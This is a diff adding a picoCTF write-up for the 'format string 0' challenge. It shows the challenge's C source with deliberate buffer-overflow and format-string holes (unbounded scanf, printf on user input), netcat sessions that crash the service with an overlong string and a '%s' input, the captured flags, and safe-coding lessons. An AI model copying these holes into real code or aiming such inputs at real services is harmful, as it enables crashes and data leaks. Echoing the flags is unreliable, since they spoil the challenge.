@@ -97,4 +97,183 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
 
 ***
 
+# 2. format string 0
 
+> Can you use your knowledge of format strings to make the customers happy?
+Download the binary `here`.
+Download the source `here`.
+Connect with the challenge instance here:
+nc mimas.picoctf.net 51241  
+
+## Solution:
+The code for this program is-  
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+
+char flag[FLAGSIZE];
+
+void sigsegv_handler(int sig) {
+    printf("\n%s\n", flag);
+    fflush(stdout);
+    exit(1);
+}
+
+int on_menu(char *burger, char *menu[], int count) {
+    for (int i = 0; i < count; i++) {
+        if (strcmp(burger, menu[i]) == 0)
+            return 1;
+    }
+    return 0;
+}
+
+void serve_patrick();
+
+void serve_bob();
+
+
+int main(int argc, char **argv){
+    FILE *f = fopen("flag.txt", "r");
+    if (f == NULL) {
+        printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                        "own debugging flag.\n");
+        exit(0);
+    }
+
+    fgets(flag, FLAGSIZE, f);
+    signal(SIGSEGV, sigsegv_handler);
+
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+
+    serve_patrick();
+
+    return 0;
+}
+
+void serve_patrick() {
+    printf("%s %s\n%s\n%s %s\n%s",
+            "Welcome to our newly-opened burger place Pico 'n Patty!",
+            "Can you help the picky customers find their favorite burger?",
+            "Here comes the first customer Patrick who wants a giant bite.",
+            "Please choose from the following burgers:",
+            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
+            "Enter your recommendation: ");
+    fflush(stdout);
+
+    char choice1[BUFSIZE];
+    scanf("%s", choice1);
+    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
+    if (!on_menu(choice1, menu1, 3)) {
+        printf("%s", "There is no such burger yet!\n");
+        fflush(stdout);
+    } else {
+        int count = printf(choice1);
+        if (count > 2 * BUFSIZE) {
+            serve_bob();
+        } else {
+            printf("%s\n%s\n",
+                    "Patrick is still hungry!",
+                    "Try to serve him something of larger size!");
+            fflush(stdout);
+        }
+    }
+}
+
+void serve_bob() {
+    printf("\n%s %s\n%s %s\n%s %s\n%s",
+            "Good job! Patrick is happy!",
+            "Now can you serve the second customer?",
+            "Sponge Bob wants something outrageous that would break the shop",
+            "(better be served quick before the shop owner kicks you out!)",
+            "Please choose from the following burgers:",
+            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
+            "Enter your recommendation: ");
+    fflush(stdout);
+
+    char choice2[BUFSIZE];
+    scanf("%s", choice2);
+    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
+    if (!on_menu(choice2, menu2, 3)) {
+        printf("%s", "There is no such burger yet!\n");
+        fflush(stdout);
+    } else {
+        printf(choice2);
+        fflush(stdout);
+    }
+}
+```  
+Similar to that in the first challenge, we see the signal `signal(SIGSEGV, sigsegv_handler);`, and the function as-  
+```c
+void sigsegv_handler(int sig) {
+    printf("\n%s\n", flag);
+    fflush(stdout);
+    exit(1);
+}
+```  
+so we need to cause a segfault again. The functions takes in the string usign scanf(), we repeat the process and get the flag.  
+```bash
+lallu@VedantLohan:~/picoctf/bin/string$ nc mimas.picoctf.net 51241
+Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
+Here comes the first customer Patrick who wants a giant bite.
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation: qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+There is no such burger yet!
+
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
+^C
+```
+
+## Flag:
+
+```
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
+```
+
+## Concepts learnt:
+- scanf() and gets() are not appropriate to read strings because they don't understand the size of the buffer allocated and can overflow while reading the string.  
+- fgets() is better because it takes the buffer size as an argument, so it can stop before overflowing.  
+- printf() prints the formatted output to the standard output (usually your terminal).  
+- printf() returns an int, the number of characters it successfully printed.  
+
+## Notes:
+
+The other way to solve this problem is that `serve_patrick()` calls `serve_bob()` if you give the correct choice for `serve_patrick`.  
+In `serve_bob()` we have a line `printf(choice2);`, with the choices `char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};`.  
+If we pick the 3rd choice `"Cla%sic_Che%s%steak"`, it contains `%s` but `printf(choice2);` doesn't have any parameters for it so it crashes.  
+```bash
+lallu@VedantLohan:~/picoctf/bin/string$ nc mimas.picoctf.net 52361
+Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
+Here comes the first customer Patrick who wants a giant bite.
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation:  Gr%114d_Cheese
+Gr                                                                                                           4202954_Cheese
+Good job! Patrick is happy! Now can you serve the second customer?
+Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
+Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
+Enter your recommendation: Cla%sic_Che%s%steak
+ClaCla%sic_Che%s%steakic_Che(null)
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
+^C
+```  
+Now the choice for patrick was  `Gr%114d_Cheese` because of the `%114d`, it makes a very long int and that in neseccary to pass the function check  
+```c
+int count = printf(choice1);
+        if (count > 2 * BUFSIZE) {
+            serve_bob();
+        }
+```  
+where `BUFSIZE` was `#define BUFSIZE 32`
+
+## Resources:
+[scanf vs gets vs fgets](https://stackoverflow.com/questions/3302255/c-scanf-vs-gets-vs-fgets)
+[printf return value](https://www.geeksforgeeks.org/c/return-values-of-printf-and-scanf-in-c-cpp/)
+
+***
